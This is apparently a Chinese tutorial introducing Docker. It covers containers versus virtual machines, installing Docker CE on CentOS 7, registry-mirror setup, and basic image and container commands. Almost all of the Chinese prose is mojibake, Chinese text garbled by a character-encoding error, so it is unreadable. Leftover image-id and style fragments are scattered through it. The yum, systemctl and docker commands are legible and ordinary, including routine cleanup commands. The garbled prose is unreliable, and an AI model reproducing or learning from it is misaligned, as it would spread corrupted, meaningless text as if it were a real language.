å®¹å™¨æŠ€æœ¯çš„å‡ºç°å°±è§£å†³äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œè€Œ Docker å°±æ˜¯åœ¨å®ƒçš„åŸºç¡€ä¸Šå‘å±•è¿‡æ¥çš„ã€‚å°†åº”ç”¨è¿è¡Œåœ¨ Docker å®¹å™¨ä¸Šé¢ï¼Œè€Œ Docker å®¹å™¨åœ¨ä»»ä½•æ“ä½œç³»ç»Ÿä¸Šéƒ½æ˜¯ä¸€è‡´çš„ï¼Œè¿™å°±å®ç°äº†è·¨å¹³å°ã€è·¨æœåŠ¡å™¨ã€‚åªéœ€è¦ä¸€æ¬¡é…ç½®å¥½ç¯å¢ƒï¼Œæ¢åˆ°åˆ«çš„æœºå­ä¸Šå°±å¯ä»¥ä¸€é”®éƒ¨ç½²å¥½ï¼Œå¤§å¤§ç®€åŒ–äº†æ“ä½œ è§£å†³äº†è¿è¡Œç¯å¢ƒå’Œé…ç½®é—®é¢˜è½¯ä»¶å®¹å™¨ï¼Œæ–¹ä¾¿åšæŒç»­é›†æˆå¹¶æœ‰åŠ©äºæ•´ä½“å‘å¸ƒçš„å®¹å™¨è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ èƒ½å¹²å—ï¼Ÿä¹‹å‰çš„è™šæ‹ŸæœºæŠ€æœ¯ï¼šè™šæ‹Ÿæœºï¼ˆvirtual machineï¼‰å°±æ˜¯å¸¦ç¯å¢ƒå®‰è£…çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚å®ƒå¯ä»¥åœ¨ä¸€ç§æ“ä½œç³»ç»Ÿé‡Œé¢è¿è¡Œå¦ä¸€ç§æ“ä½œç³»ç»Ÿï¼Œæ¯”å¦‚åœ¨Windows ç³»ç»Ÿé‡Œé¢è¿è¡ŒLinux ç³»ç»Ÿã€‚åº”ç”¨ç¨‹åºå¯¹æ­¤æ¯«æ— æ„ŸçŸ¥ï¼Œå› ä¸ºè™šæ‹Ÿæœºçœ‹ä¸Šå»è·ŸçœŸå®ç³»ç»Ÿä¸€æ¨¡ä¸€æ ·ï¼Œè€Œå¯¹äºåº•å±‚ç³»ç»Ÿæ¥è¯´ï¼Œè™šæ‹Ÿæœºå°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œä¸éœ€è¦äº†å°±åˆ æ‰ï¼Œå¯¹å…¶ä»–éƒ¨åˆ†æ¯«æ— å½±å“ã€‚è¿™ç±»è™šæ‹Ÿæœºå®Œç¾çš„è¿è¡Œäº†å¦ä¸€å¥—ç³»ç»Ÿï¼Œèƒ½å¤Ÿä½¿åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ä¸‰è€…ä¹‹é—´çš„é€»è¾‘ä¸å˜ã€‚ 1598604274549\" style=\"zoom:67%; è™šæ‹Ÿæœºçš„ç¼ºç‚¹ï¼š1 èµ„æºå ç”¨å¤š 2 å†—ä½™æ­¥éª¤å¤š 3 å¯åŠ¨æ…¢ å®¹å™¨è™šæ‹ŸåŒ–æŠ€æœ¯ç”±äºå‰é¢è™šæ‹Ÿæœºå­˜åœ¨è¿™äº›ç¼ºç‚¹ï¼ŒLinux å‘å±•å‡ºäº†å¦ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼šLinux å®¹å™¨ï¼ˆLinux Containersï¼Œç¼©å†™ä¸º LXCï¼‰ã€‚Linux å®¹å™¨ä¸æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯å¯¹è¿›ç¨‹è¿›è¡Œéš”ç¦»ã€‚æœ‰äº†å®¹å™¨ï¼Œå°±å¯ä»¥å°†è½¯ä»¶è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰èµ„æºæ‰“åŒ…åˆ°ä¸€ä¸ªéš”ç¦»çš„å®¹å™¨ä¸­ã€‚å®¹å™¨ä¸è™šæ‹Ÿæœºä¸åŒï¼Œä¸éœ€è¦æ†ç»‘ä¸€æ•´å¥—æ“ä½œç³»ç»Ÿï¼Œåªéœ€è¦è½¯ä»¶å·¥ä½œæ‰€éœ€çš„åº“èµ„æºå’Œè®¾ç½®ã€‚ç³»ç»Ÿå› æ­¤è€Œå˜å¾—é«˜æ•ˆè½»é‡å¹¶ä¿è¯éƒ¨ç½²åœ¨ä»»ä½•ç¯å¢ƒä¸­çš„è½¯ä»¶éƒ½èƒ½å§‹ç»ˆå¦‚ä¸€åœ°è¿è¡Œã€‚ 1598604334770\" style=\"zoom:67%; æ¯”è¾ƒäº† Docker å’Œä¼ ç»Ÿè™šæ‹ŸåŒ–æ–¹å¼çš„ä¸åŒä¹‹å¤„ï¼šä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ï¼› è€Œå®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚ æ¯ä¸ªå®¹å™¨ä¹‹é—´äº’ç›¸éš”ç¦»ï¼Œæ¯ä¸ªå®¹å™¨æœ‰è‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿ ï¼Œå®¹å™¨ä¹‹é—´è¿›ç¨‹ä¸ä¼šç›¸äº’å½±å“ï¼Œèƒ½åŒºåˆ†è®¡ç®—èµ„æºã€‚ å¼€å‘/è¿ç»´ï¼ˆDevOpsï¼‰ ä¸€æ¬¡æ„å»ºã€éšå¤„è¿è¡Œ æ›´å¿«é€Ÿçš„åº”ç”¨äº¤ä»˜å’Œéƒ¨ç½² ä¼ ç»Ÿçš„åº”ç”¨å¼€å‘å®Œæˆåï¼Œéœ€è¦æä¾›ä¸€å †å®‰è£…ç¨‹åºå’Œé…ç½®è¯´æ˜æ–‡æ¡£ï¼Œå®‰è£…éƒ¨ç½²åéœ€æ ¹æ®é…ç½®æ–‡æ¡£è¿›è¡Œç¹æ‚çš„é…ç½®æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚DockeråŒ–ä¹‹ååªéœ€è¦äº¤ä»˜å°‘é‡å®¹å™¨é•œåƒæ–‡ä»¶ï¼Œåœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒåŠ è½½é•œåƒå¹¶è¿è¡Œå³å¯ï¼Œåº”ç”¨å®‰è£…é…ç½®åœ¨é•œåƒé‡Œå·²ç»å†…ç½®å¥½ï¼Œå¤§å¤§èŠ‚çœéƒ¨ç½²é…ç½®å’Œæµ‹è¯•éªŒè¯æ—¶é—´ã€‚ æ›´ä¾¿æ·çš„å‡çº§å’Œæ‰©ç¼©å®¹ éšç€å¾®æœåŠ¡æ¶æ„å’ŒDockerçš„å‘å±•ï¼Œå¤§é‡çš„åº”ç”¨ä¼šé€šè¿‡å¾®æœåŠ¡æ–¹å¼æ¶æ„ï¼Œåº”ç”¨çš„å¼€å‘æ„å»ºå°†å˜æˆæ­ä¹é«˜ç§¯æœ¨ä¸€æ ·ï¼Œæ¯ä¸ªDockerå®¹å™¨å°†å˜æˆä¸€å—â€œç§¯æœ¨â€ï¼Œåº”ç”¨çš„å‡çº§å°†å˜å¾—éå¸¸å®¹æ˜“ã€‚å½“ç°æœ‰çš„å®¹å™¨ä¸è¶³ä»¥æ”¯æ’‘ä¸šåŠ¡å¤„ç†æ—¶ï¼Œå¯é€šè¿‡é•œåƒè¿è¡Œæ–°çš„å®¹å™¨è¿›è¡Œå¿«é€Ÿæ‰©å®¹ï¼Œä½¿åº”ç”¨ç³»ç»Ÿçš„æ‰©å®¹ä»åŸå…ˆçš„å¤©çº§å˜æˆåˆ†é’Ÿçº§ç”šè‡³ç§’çº§ã€‚ æ›´ç®€å•çš„ç³»ç»Ÿè¿ç»´ åº”ç”¨å®¹å™¨åŒ–è¿è¡Œåï¼Œç”Ÿäº§ç¯å¢ƒè¿è¡Œçš„åº”ç”¨å¯ä¸å¼€å‘ã€æµ‹è¯•ç¯å¢ƒçš„åº”ç”¨é«˜åº¦ä¸€è‡´ï¼Œå®¹å™¨ä¼šå°†åº”ç”¨ç¨‹åºç›¸å…³çš„ç¯å¢ƒå’ŒçŠ¶æ€å®Œå…¨å°è£…èµ·æ¥ï¼Œä¸ä¼šå› ä¸ºåº•å±‚åŸºç¡€æ¶æ„å’Œæ“ä½œç³»ç»Ÿçš„ä¸ä¸€è‡´æ€§ç»™åº”ç”¨å¸¦æ¥å½±å“ï¼Œäº§ç”Ÿæ–°çš„BUGã€‚å½“å‡ºç°ç¨‹åºå¼‚å¸¸æ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æµ‹è¯•ç¯å¢ƒçš„ç›¸åŒå®¹å™¨è¿›è¡Œå¿«é€Ÿå®šä½å’Œä¿®å¤ã€‚ æ›´é«˜æ•ˆçš„è®¡ç®—èµ„æºåˆ©ç”¨ Dockeræ˜¯å†…æ ¸çº§è™šæ‹ŸåŒ–ï¼Œå…¶ä¸åƒä¼ ç»Ÿçš„è™šæ‹ŸåŒ–æŠ€æœ¯ä¸€æ ·éœ€è¦é¢å¤–çš„Hypervisoræ”¯æŒï¼Œæ‰€ä»¥åœ¨ä¸€å°ç‰©ç†æœºä¸Šå¯ä»¥è¿è¡Œå¾ˆå¤šä¸ªå®¹å™¨å®ä¾‹ï¼Œå¯å¤§å¤§æå‡ç‰©ç†æœåŠ¡å™¨çš„CPUå’Œå†…å­˜çš„åˆ©ç”¨ç‡ã€‚ dockerä¸­æ–‡ç½‘ç«™ï¼šhttps://www.docker-cn.com/ ä»“åº“ï¼šDocker Hubå®˜ç½‘: https://hub.docker.com/ å®‰è£…å‰æï¼šCentOS Docker å®‰è£…Dockeræ”¯æŒä»¥ä¸‹çš„CentOSç‰ˆæœ¬ï¼šCentOS 7 (64-bit)CentOS 6.5 (64-bit) æˆ–æ›´é«˜çš„ç‰ˆæœ¬ å‰ææ¡ä»¶ç›®å‰ï¼ŒCentOS ä»…å‘è¡Œç‰ˆæœ¬ä¸­çš„å†…æ ¸æ”¯æŒ Dockerã€‚Docker è¿è¡Œåœ¨ CentOS 7 ä¸Šï¼Œè¦æ±‚ç³»ç»Ÿä¸º64ä½ã€ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ä¸º 3.10 ä»¥ä¸Šã€‚Docker è¿è¡Œåœ¨ CentOS-6.5 æˆ–æ›´é«˜çš„ç‰ˆæœ¬çš„ CentOS ä¸Šï¼Œè¦æ±‚ç³»ç»Ÿä¸º64ä½ã€ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ä¸º 2.6.32-431 æˆ–è€…æ›´é«˜ç‰ˆæœ¬ã€‚ æŸ¥çœ‹è‡ªå·±çš„å†…æ ¸unameå‘½ä»¤ç”¨äºæ‰“å°å½“å‰ç³»ç»Ÿç›¸å…³ä¿¡æ¯ï¼ˆå†…æ ¸ç‰ˆæœ¬å·ã€ç¡¬ä»¶æ¶æ„ã€ä¸»æœºåç§°å’Œæ“ä½œç³»ç»Ÿç±»å‹ç­‰ï¼‰ã€‚ 1598605075304 æŸ¥çœ‹å·²å®‰è£…çš„CentOSç‰ˆæœ¬ä¿¡æ¯ï¼ˆCentOS6.8æœ‰ï¼ŒCentOS7æ— è¯¥å‘½ä»¤ï¼‰ 1598605093121 1598605106745 Dockerçš„åŸºæœ¬ç»„æˆé•œåƒï¼ˆimageï¼‰ Docker é•œåƒï¼ˆImageï¼‰å°±æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ã€‚é•œåƒå¯ä»¥ç”¨æ¥åˆ›å»º Docker å®¹å™¨ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¾ˆå¤šå®¹å™¨ã€‚ 1 å®¹å™¨ï¼ˆcontainerï¼‰ Docker åˆ©ç”¨å®¹å™¨ï¼ˆContainerï¼‰ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨ã€‚å®¹å™¨æ˜¯ç”¨é•œåƒåˆ›å»ºçš„è¿è¡Œå®ä¾‹ã€‚ å®ƒå¯ä»¥è¢«å¯åŠ¨ã€å¼€å§‹ã€åœæ­¢ã€åˆ é™¤ã€‚æ¯ä¸ªå®¹å™¨éƒ½æ˜¯ç›¸äº’éš”ç¦»çš„ã€ä¿è¯å®‰å…¨çš„å¹³å°ã€‚ å¯ä»¥æŠŠå®¹å™¨çœ‹åšæ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆçš„ Linux ç¯å¢ƒï¼ˆåŒ…æ‹¬rootç”¨æˆ·æƒé™ã€è¿›ç¨‹ç©ºé—´ã€ç”¨æˆ·ç©ºé—´å’Œç½‘ç»œç©ºé—´ç­‰ï¼‰å’Œè¿è¡Œåœ¨å…¶ä¸­çš„åº”ç”¨ç¨‹åºã€‚ å®¹å™¨çš„å®šä¹‰å’Œé•œåƒå‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€å †å±‚çš„ç»Ÿä¸€è§†è§’ï¼Œå”¯ä¸€åŒºåˆ«åœ¨äºå®¹å™¨çš„æœ€ä¸Šé¢é‚£ä¸€å±‚æ˜¯å¯è¯»å¯å†™çš„ã€‚ ä»“åº“ï¼ˆrepositoryï¼‰ ä»“åº“ï¼ˆRepositoryï¼‰æ˜¯é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœºæ‰€ã€‚ä»“åº“(Repository)å’Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ï¼ˆRegistryï¼‰æ˜¯æœ‰åŒºåˆ«çš„ã€‚ä»“åº“æ³¨å†ŒæœåŠ¡å™¨ä¸Šå¾€å¾€å­˜æ”¾ç€å¤šä¸ªä»“åº“ï¼Œæ¯ä¸ªä»“åº“ä¸­åˆåŒ…å«äº†å¤šä¸ªé•œåƒï¼Œæ¯ä¸ªé•œåƒæœ‰ä¸åŒçš„æ ‡ç­¾ï¼ˆtagï¼‰ã€‚ ä»“åº“åˆ†ä¸ºå…¬å¼€ä»“åº“ï¼ˆPublicï¼‰å’Œç§æœ‰ä»“åº“ï¼ˆPrivateï¼‰ä¸¤ç§å½¢å¼ã€‚æœ€å¤§çš„å…¬å¼€ä»“åº“æ˜¯ Docker Hub(https://hub.docker.com/)ï¼Œå­˜æ”¾äº†æ•°é‡åºå¤§çš„é•œåƒä¾›ç”¨æˆ·ä¸‹è½½ã€‚å›½å†…çš„å…¬å¼€ä»“åº“åŒ…æ‹¬é˜¿é‡Œäº‘ ã€ç½‘æ˜“äº‘ ç­‰ å°æ€»ç»“ éœ€è¦æ­£ç¡®çš„ç†è§£ä»“å‚¨/é•œåƒ/å®¹å™¨è¿™å‡ ä¸ªæ¦‚å¿µ: Docker æœ¬èº«æ˜¯ä¸€ä¸ªå®¹å™¨è¿è¡Œè½½ä½“æˆ–ç§°ä¹‹ä¸ºç®¡ç†å¼•æ“ã€‚æˆ‘ä»¬æŠŠåº”ç”¨ç¨‹åºå’Œé…ç½®ä¾èµ–æ‰“åŒ…å¥½å½¢æˆä¸€ä¸ªå¯äº¤ä»˜çš„è¿è¡Œç¯å¢ƒï¼Œè¿™ä¸ªæ‰“åŒ…å¥½çš„è¿è¡Œç¯å¢ƒå°±ä¼¼ä¹ imageé•œåƒæ–‡ä»¶ã€‚åªæœ‰é€šè¿‡è¿™ä¸ªé•œåƒæ–‡ä»¶æ‰èƒ½ç”Ÿæˆ Docker å®¹å™¨ã€‚image æ–‡ä»¶å¯ä»¥çœ‹ä½œæ˜¯å®¹å™¨çš„æ¨¡æ¿ã€‚Docker æ ¹æ® image æ–‡ä»¶ç”Ÿæˆå®¹å™¨çš„å®ä¾‹ã€‚åŒä¸€ä¸ª image æ–‡ä»¶ï¼Œå¯ä»¥ç”Ÿæˆå¤šä¸ªåŒæ—¶è¿è¡Œçš„å®¹å™¨å®ä¾‹ã€‚ image æ–‡ä»¶ç”Ÿæˆçš„å®¹å™¨å®ä¾‹ï¼Œæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç§°ä¸ºé•œåƒæ–‡ä»¶ã€‚ ä¸€ä¸ªå®¹å™¨è¿è¡Œä¸€ç§æœåŠ¡ï¼Œå½“æˆ‘ä»¬éœ€è¦çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡dockerå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„è¿è¡Œå®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å®¹å™¨ è‡³äºä»“å‚¨ï¼Œå°±æ˜¯æ”¾äº†ä¸€å †é•œåƒçš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠé•œåƒå‘å¸ƒåˆ°ä»“å‚¨ä¸­ï¼Œéœ€è¦çš„æ—¶å€™ä»ä»“å‚¨ä¸­æ‹‰ä¸‹æ¥å°±å¯ä»¥äº†ã€‚ Dockerçš„æ¶æ„å›¾1598605341500 CentOS7å®‰è£…Docker https://docs.docker.com/install/linux/docker-ce/centos/ å®˜ç½‘ä¸­æ–‡å®‰è£…å‚è€ƒæ‰‹å†Œ: https://docs.docker-cn.com/engine/installation/linux/docker-ce/centos/#prerequisites ç¡®å®šä½ æ˜¯CentOS7åŠä»¥ä¸Šç‰ˆæœ¬ cat /etc/redhat-release yumå®‰è£…gccç›¸å…³ CentOS7èƒ½ä¸Šå¤–ç½‘ 1 yum -y install gcc yum -y install gcc-c++ å¸è½½æ—§ç‰ˆæœ¬ yum -y remove docker docker-common docker-selinux docker-engine 2018.3å®˜ç½‘ç‰ˆæœ¬ yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine å®‰è£…éœ€è¦çš„è½¯ä»¶åŒ… yum install -y yum-utils device-mapper-persistent-data lvm2 è®¾ç½®stableé•œåƒä»“åº“ yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo æ›´æ–°yumè½¯ä»¶åŒ…ç´¢å¼• yum makecache fast å®‰è£…DOCKER CE yum -y install docker-ce å¯åŠ¨docker systemctl start docker æµ‹è¯• docker version docker run hello-world é…ç½®é•œåƒåŠ é€Ÿ ```cmdmkdir -p /etc/docker vim /etc/docker/daemon.jsonç½‘æ˜“äº‘{â€œregistry-mirrorsâ€: [â€œhttp://hub-mirror.c.163.comâ€œ] } #é˜¿é‡Œäº‘ { &quot;registry-mirrors&quot;: [&quot;https://ï½›è‡ªå·²çš„ç¼–ç ï½.mirror.aliyuncs.com&quot;] } ---- systemctl daemon-reload systemctl restart docker ``` å¸è½½ systemctl stop docker yum -y remove docker-ce rm -rf /var/lib/docker ä½¿ç”¨é˜¿é‡Œäº‘é•œåƒåŠ é€Ÿ https://dev.aliyun.com/search.html ç™»é™†é˜¿é‡Œäº‘å¼€å‘è€…å¹³å°,è·å–åŠ é€Ÿå™¨åœ°å€ 1598605448117 é…ç½®æœ¬æœºDockerè¿è¡Œé•œåƒåŠ é€Ÿå™¨ é‰´äºå›½å†…ç½‘ç»œé—®é¢˜ï¼Œåç»­æ‹‰å– Docker é•œåƒååˆ†ç¼“æ…¢ï¼Œæˆ‘ä»¬å¯ä»¥éœ€è¦é…ç½®åŠ é€Ÿå™¨æ¥è§£å†³ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯é˜¿é‡Œäº‘çš„æœ¬äººè‡ªå·±è´¦å·çš„é•œåƒåœ°å€(éœ€è¦è‡ªå·±æ³¨å†Œæœ‰ä¸€ä¸ªå±äºä½ è‡ªå·±çš„)ï¼š https://xxxx.mirror.aliyuncs.com vim /etc/sysconfig/docker å°†è·å¾—çš„è‡ªå·±è´¦æˆ·ä¸‹çš„é˜¿é‡Œäº‘åŠ é€Ÿåœ°å€é…ç½®è¿› other_args=&quot;--registry-mirror=https://ä½ è‡ªå·±çš„è´¦å·åŠ é€Ÿä¿¡æ¯.mirror.aliyuncs.com&quot; 1598605528307 é‡æ–°å¯åŠ¨Dockeråå°æœåŠ¡ï¼šservice docker restart Linux ç³»ç»Ÿä¸‹é…ç½®å®ŒåŠ é€Ÿå™¨éœ€è¦æ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆ å¦‚æœä»ç»“æœä¸­çœ‹åˆ°äº†é…ç½®çš„â€”registry-mirrorå‚æ•°è¯´æ˜é…ç½®æˆåŠŸï¼Œå¦‚ä¸‹æ‰€ç¤º: 1598605562504 å¯åŠ¨Dockeråå°å®¹å™¨(æµ‹è¯•è¿è¡Œ hello-world)docker run hello-world 1598605611408 è¾“å‡ºè¿™æ®µæç¤ºä»¥åï¼Œhello worldå°±ä¼šåœæ­¢è¿è¡Œï¼Œå®¹å™¨è‡ªåŠ¨ç»ˆæ­¢ã€‚ runå¹²äº†ä»€ä¹ˆ 1598605642470 Dockeræ˜¯æ€ä¹ˆå·¥ä½œçš„ Dockeræ˜¯ä¸€ä¸ªClient-Serverç»“æ„çš„ç³»ç»Ÿï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸»æœºä¸Šï¼Œ ç„¶åé€šè¿‡Socketè¿æ¥ä»å®¢æˆ·ç«¯è®¿é—®ï¼Œå®ˆæŠ¤è¿›ç¨‹ä»å®¢æˆ·ç«¯æ¥å—å‘½ä»¤å¹¶ç®¡ç†è¿è¡Œåœ¨ä¸»æœºä¸Šçš„å®¹å™¨ã€‚ å®¹å™¨ï¼Œæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒï¼Œå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´åˆ°çš„é›†è£…ç®±ã€‚ 1598605821646 ä¸ºä»€ä¹ˆDockeræ¯”è¾ƒæ¯”VMå¿« (1)dockeræœ‰ç€æ¯”è™šæ‹Ÿæœºæ›´å°‘çš„æŠ½è±¡å±‚ã€‚ç”±äºdockerä¸éœ€è¦Hypervisorå®ç°ç¡¬ä»¶èµ„æºè™šæ‹ŸåŒ–,è¿è¡Œåœ¨dockerå®¹å™¨ä¸Šçš„ç¨‹åºç›´æ¥ä½¿ç”¨çš„éƒ½æ˜¯å®é™…ç‰©ç†æœºçš„ç¡¬ä»¶èµ„æºã€‚å› æ­¤åœ¨CPUã€å†…å­˜åˆ©ç”¨ç‡ä¸Šdockerå°†ä¼šåœ¨æ•ˆç‡ä¸Šæœ‰æ˜æ˜¾ä¼˜åŠ¿ã€‚ (2)dockeråˆ©ç”¨çš„æ˜¯å®¿ä¸»æœºçš„å†…æ ¸,è€Œä¸éœ€è¦Guest OSã€‚å› æ­¤,å½“æ–°å»ºä¸€ä¸ªå®¹å™¨æ—¶,dockerä¸éœ€è¦å’Œè™šæ‹Ÿæœºä¸€æ ·é‡æ–°åŠ è½½ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ã€‚ä»è€Œé¿å…å¼•å¯»ã€åŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸è¿”ä¸ªæ¯”è¾ƒè´¹æ—¶è´¹èµ„æºçš„è¿‡ç¨‹,å½“æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºæ—¶,è™šæ‹Ÿæœºè½¯ä»¶éœ€è¦åŠ è½½Guest OS,è¿”ä¸ªæ–°å»ºè¿‡ç¨‹æ˜¯åˆ†é’Ÿçº§åˆ«çš„ã€‚è€Œdockerç”±äºç›´æ¥åˆ©ç”¨å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿ,åˆ™çœç•¥äº†è¿”ä¸ªè¿‡ç¨‹,å› æ­¤æ–°å»ºä¸€ä¸ªdockerå®¹å™¨åªéœ€è¦å‡ ç§’é’Ÿã€‚ 1 Dockerå¸¸ç”¨å‘½ä»¤å¸®åŠ©å‘½ä»¤ docker version docker info docker â€”help é•œåƒå‘½ä»¤ docker images åˆ—å‡ºæœ¬åœ°ä¸»æœºä¸Šçš„é•œåƒ 1598606088968 å„ä¸ªé€‰é¡¹è¯´æ˜: REPOSITORYï¼šè¡¨ç¤ºé•œåƒçš„ä»“åº“æº TAGï¼šé•œåƒçš„æ ‡ç­¾ IMAGE IDï¼šé•œåƒID CREATEDï¼šé•œåƒåˆ›å»ºæ—¶é—´ SIZEï¼šé•œåƒå¤§å° åŒä¸€ä»“åº“æºå¯ä»¥æœ‰å¤šä¸ª TAGï¼Œä»£è¡¨è¿™ä¸ªä»“åº“æºçš„ä¸åŒä¸ªç‰ˆæœ¬ï¼Œæˆ‘ä»¬ä½¿ç”¨ REPOSITORY:TAG æ¥å®šä¹‰ä¸åŒçš„é•œåƒã€‚å¦‚æœä½ ä¸æŒ‡å®šä¸€ä¸ªé•œåƒçš„ç‰ˆæœ¬æ ‡ç­¾ï¼Œä¾‹å¦‚ä½ åªä½¿ç”¨ ubuntuï¼Œdocker å°†é»˜è®¤ä½¿ç”¨ ubuntu:latest é•œåƒ OPTIONSè¯´æ˜ï¼š -a :åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„é•œåƒï¼ˆå«ä¸­é—´æ˜ åƒå±‚ï¼‰ -q :åªæ˜¾ç¤ºé•œåƒIDã€‚ â€”digests :æ˜¾ç¤ºé•œåƒçš„æ‘˜è¦ä¿¡æ¯ â€”no-trunc :æ˜¾ç¤ºå®Œæ•´çš„é•œåƒä¿¡æ¯ docker search æŸä¸ªXXXé•œåƒåå­— https://hub.docker.com å‘½ä»¤: docker search [OPTIONS] é•œåƒåå­— OPTIONSè¯´æ˜ï¼š â€”no-trunc : æ˜¾ç¤ºå®Œæ•´çš„é•œåƒæè¿° -s : åˆ—å‡ºæ”¶è—æ•°ä¸å°äºæŒ‡å®šå€¼çš„é•œåƒã€‚ â€”automated : åªåˆ—å‡º automated buildç±»å‹çš„é•œåƒï¼› docker pull æŸä¸ªXXXé•œåƒåå­— ä¸‹è½½é•œåƒ docker pull é•œåƒåå­—[:TAG] docker rmi æŸä¸ªXXXé•œåƒåå­—ID åˆ é™¤é•œåƒ åˆ é™¤å•ä¸ª docker rmi -f é•œåƒID åˆ é™¤å¤šä¸ª docker rmi -f é•œåƒå1:TAG é•œåƒå2:TAG åˆ é™¤å…¨éƒ¨ docker rmi -f $(docker images -qa) ï¼Ÿæ€è€ƒ ç»“åˆæˆ‘ä»¬Gitçš„å­¦ä¹ å¿ƒå¾—ï¼Œå¤§å®¶çŒœçŒœæ˜¯å¦ä¼šæœ‰docker commit /docker pushï¼Ÿï¼Ÿ å®¹å™¨å‘½ä»¤ æœ‰é•œåƒæ‰èƒ½åˆ›å»ºå®¹å™¨ï¼Œè¿™æ˜¯æ ¹æœ¬å‰æ(ä¸‹è½½ä¸€ä¸ªCentOSé•œåƒæ¼”ç¤º) docker pull centos æ–°å»ºå¹¶å¯åŠ¨å®¹å™¨ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] OPTIONSè¯´æ˜: æœ‰äº›æ˜¯ä¸€ä¸ªå‡å·ï¼Œæœ‰äº›æ˜¯ä¸¤ä¸ªå‡å· --name=&quot;å®¹å™¨æ–°åå­—&quot;: ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼› -d: åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼Œä¹Ÿå³å¯åŠ¨å®ˆæŠ¤å¼å®¹å™¨ï¼› -iï¼šä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼› -tï¼šä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼› -P: éšæœºç«¯å£æ˜ å°„ï¼› -p: æŒ‡å®šç«¯å£æ˜ å°„ï¼Œæœ‰ä»¥ä¸‹å››ç§æ ¼å¼ ip:hostPort:containerPort ip::containerPort hostPort:containerPort containerPort å¯åŠ¨äº¤äº’å¼å®¹å™¨ 1598606569114 #ä½¿ç”¨é•œåƒcentos:latestä»¥äº¤äº’æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,åœ¨å®¹å™¨å†…æ‰§è¡Œ/bin/bashå‘½ä»¤ã€‚ docker run -it centos /bin/bash åˆ—å‡ºå½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker ps [OPTIONS] ------------------------------------- OPTIONSè¯´æ˜ -a :åˆ—å‡ºå½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨+å†å²ä¸Šè¿è¡Œè¿‡çš„ -l :æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨ã€‚ -nï¼šæ˜¾ç¤ºæœ€è¿‘nä¸ªåˆ›å»ºçš„å®¹å™¨ã€‚ -q 